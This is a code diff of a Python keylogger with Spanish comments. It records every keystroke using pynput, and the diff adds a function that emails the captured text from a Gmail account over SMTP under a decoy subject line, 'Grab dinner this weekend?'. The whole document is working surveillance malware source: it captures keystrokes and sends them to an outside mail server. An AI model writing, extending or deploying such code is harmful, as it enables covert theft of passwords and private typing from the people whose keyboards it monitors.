@@ -1,34 +1,47 @@
 from pynput import keyboard
+import smtplib
+import os
+from email.message import EmailMessage
 
+email = os.environ.get("EMAIL_USER")
+passw = os.environ.get("EMAIL_PASS")
 palabra = []
 text = ""
 item = ""
+
+# Collect events until released
+def read():
+    with keyboard.Listener(
+            on_press=on_press,
+            on_release=on_release,
+    ) as listener:
+        listener.join()
 
 
 def on_press(key):
     # palabra.append(key.char)
     global text
-     #   text += str(key.char)
+    #   text += str(key.char)
     if str(key) == "Key.enter":
-        text+="\n"
+        text += "\n"
     elif str(key) == "Key.space":
-        text+=" "
+        text += " "
     elif str(key) == "Key.backspace":
-        text=text[:-1]
+        text += "%se borró una letra%"
     elif str(key) == "Key.up":
-        print("%flecha arriba%")
+        text += "%flecha arriba%"
     elif str(key) == "Key.down":
-        print("%flecha abajo%")
+        text +="%flecha abajo%"
     elif str(key) == "Key.left":
-        print("%flecha izquierda%")
+        text +="%flecha izquierda%"
     elif str(key) == "Key.right":
-        print("%flecha derecha%")
-    elif str(key) == "Key.esc" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(key) == "Key.alt_gr" or str(key) == "Key.ctrl_l" :
+        text +="%flecha derecha%"
+    elif str(key) == "Key.esc" or str(key) == "Key.shift_r" or str(key) == "Key.shift" or str(
+            key) == "Key.alt_gr" or str(key) == "Key.ctrl_l":
         pass
-
     else:
         print(key)
-        text+=key.char
+        text += key.char
 
 
 def on_release(key):
@@ -36,13 +49,27 @@ def on_release(key):
         # Stop listener
         return False
 
+def send(text):
+    msg = EmailMessage()
+    msg['Subject'] = 'Grab dinner this weekend?'
+    msg['From'] = email
+    msg['To'] = email
+    msg.set_content(f'Se detectó lo siguiente:\n{text}')
 
-# Collect events until released
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release,
-) as listener:
-    listener.join()
-f = "-"
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+        smtp.login(email, passw)
+        smtp.send_message(msg)
 
-print("Al final sale:\n{0}".format(text))
+def test(text):
+    print("Al final sale:\n{0}".format(text))
+
+def main():
+    read()
+    test(text)
+    send(text)
+
+
+if __name__ == "__main__":
+    main()
+
+
